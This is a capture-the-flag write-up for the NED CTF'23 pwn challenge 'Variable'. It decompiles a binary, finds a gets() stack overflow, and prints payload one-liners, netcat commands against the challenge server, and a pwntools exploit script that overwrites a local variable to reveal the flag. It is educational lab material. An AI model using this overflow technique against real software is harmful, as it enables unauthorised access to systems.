---
title: NED CTF'23 - Pwn - Variable
date: '2023-07-03'
tags: ['ctf', 'pwn', 'nedctf', 'writeup', 'buffer-overflow', 'x64', 'variable-overwrite']
draft: false
summary: Overwriting variable to get the flag.
---

## Challenge Description

Navigate the binary labyrinth and bend variables to your will.

Author: [Saad Akhtar](https://twitter.com/ssaadakhtarr)

```bash
nc 159.223.192.150 9003
```

![chal-info](/static/writeups/nedctf/pwn/var0.png)

## Solution

Downloading the `variable.zip`, we get the following files

![files](/static/writeups/nedctf/pwn/var1.png)

The `file` security checks on the binary are as follows

![file](/static/writeups/nedctf/pwn/var2.png)

Let's run the `variable` binary to check what it does

![run](/static/writeups/nedctf/pwn/var3.png)

Okay, let's disassemble and check the functions inside ghidra

![functions](/static/writeups/nedctf/pwn/var4.png)

We can see a function called `authenticator`, which seems to be the function that checks if we have the correct password. The disassembled function is as follows

```c

void authenticator(void) {
  char *pcVar1;
  char local_168 [256];
  char local_68 [16];
  char local_58 [64];
  FILE *local_18;
  int local_c;
  
  local_c = -0x11e2153;
  printf("\n\n\nEnter the username: ");
  gets(local_58);
  printf("\nHello %s!\n",local_58);
  printf("\nPlease enter the secret password: ");
  fgets(local_68,0x10,stdin);
  if (local_c == -0x350c454d) {
    local_18 = fopen("flag.txt","r");
    if (local_18 == (FILE *)0x0) {
      puts("\nError: could not open file");
    }
    else {
      printf("\nAccess Granted!\nHere\'s the flag: ");
      while( true ) {
        pcVar1 = fgets(local_168,0x100,local_18);
        if (pcVar1 == (char *)0x0) break;
        printf("%s",local_168);
      }
      fclose(local_18);
    }
  }
  else {
    printf("\nAccess Denied!");
  }
  return;
}
```

Now, inside ghidra, we'll press `l` to rename variables, let's rename the variables accordingly and then the function becomes

```c
void authenticator() {
  char *ret;
  char flagBuffer [256];
  char secretPass [16];
  char userBuffer [64];
  FILE *fd_flag;
  int toOverwrite;
  
  toOverwrite = L'\xfee1dead';
  printf("\n\n\nEnter the username: ");
  gets(userBuffer);
  printf("\nHello %s!\n",userBuffer);
  printf("\nPlease enter the secret password: ");
  fgets(secretPass,0x10,stdin);
  if (toOverwrite == L'\xcaf3bab3') {
    fd_flag = fopen("flag.txt","r");
    if (fd_flag == (FILE *)0x0) {
      puts("\nError: could not open file");
    }
    else {
      printf("\nAccess Granted!\nHere\'s the flag: ");
      while( true ) {
        ret = fgets(flagBuffer,0x100,fd_flag);
        if (ret == (char *)0x0) break;
        printf("%s",flagBuffer);
      }
      fclose(fd_flag);
    }
  }
  else {
    printf("\nAccess Denied!");
  }
  return;
}
```

Now, we can understand quite easily what the function is doing. and see that `gets` function to perform our buffer overflow on. Let's understand the flow of this function:

1. Asking for username (gets) [unsafe]
2. Asking for secret password (fgets) [safe]
3. Checking if `toOverwrite` variable is `0xcaf3bab3` [Hardcoded value is 0xfee1dead]

### Exploitation

So, in order to overwrite the `toOverwrite` variable, we need to overflow the `userBuffer` variable. We're dealing with an `x64` binary, and the buffer size is 64, in order to overflow the `toOverwrite` variable, we need to overflow the `userBuffer` variable and then the `toOverwrite` variable.

So, we need to do some basic maths. Firstly, the buffer is of 64 bytes. In order to overflow this, we need to add 8 bytes to it, i.e. 72 bytes. Now, in order to find the offset of the variable, let's set a breakpoint on `authenticator` function inside gdb and then run the binary

```bash
(gdb) b *authenticator
```

![breakpoint](/static/writeups/nedctf/pwn/var5.png)

Now, we can see that the data of `toOverwrite` is being stored [rbp-4]. So, in our 72 bytes, we need to add 4 more bytes, and then the 4 byte dword i.e. `0xcaf3bab3`. So, our payload will be

```bash
python -c "print('A'*72 + '\x90' * 4 + '\xb3\xba\xf3\xca')" | ./variable
```

![flag](/static/writeups/nedctf/pwn/var6.png)

Now, it's recommended that we add `NOPS` to avoid mistakenly messing up the stack. So, let's redirect this exact payload to our nc listener:

```bash
python -c "print('A'*72 + '\x90' * 4 + '\xb3\xba\xf3\xca')" | nc 159.223.192.150 9003
```

![flag](/static/writeups/nedctf/pwn/var7.png)

For some reason, it got stuck here, to fix this, i added a `newline ('\x0a')` to the payload, and it worked

```bash
python -c "print('A'*72 + '\x90' * 4 + '\xb3\xba\xf3\xca' + '\x0a')" | nc 159.223.192.150 9003
```

> NOTE: If someone can explain to me, in detail why we need \n, please do so on Discord (TheFlash2k). Also, why I think we need the newline is that the `fgets` function is waiting for a newline, and we're not providing it, so it's stuck there. I may be wrong, or may be right, but I'm not sure. I just added it there and the exploit worked.

![flag](/static/writeups/nedctf/pwn/var8.png)

```md
Flag: NCC{s3cr3t_ov3rr1d3n_pwn3d}
```

Now, the exploit.py for this is as follows:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
import sys
import re

_bin = "./variable"
elf = context.binary = ELF(_bin)

if len(sys.argv) == 2 and sys.argv[1].lower() == "remote":
	io = remote('159.223.192.150', 9003)
else:
	io = process(_bin)

io.recv()

payload = flat(
	[
		b"A" * 72,
		b"\x90" * 4,
		p32(0xcaf3bab3),
		b'\n' # can be 0x0a
	]
)

io.sendline(payload)
buf = io.recv().decode('latin-1')
print(buf)
```

![flag](/static/writeups/nedctf/pwn/var9.png)
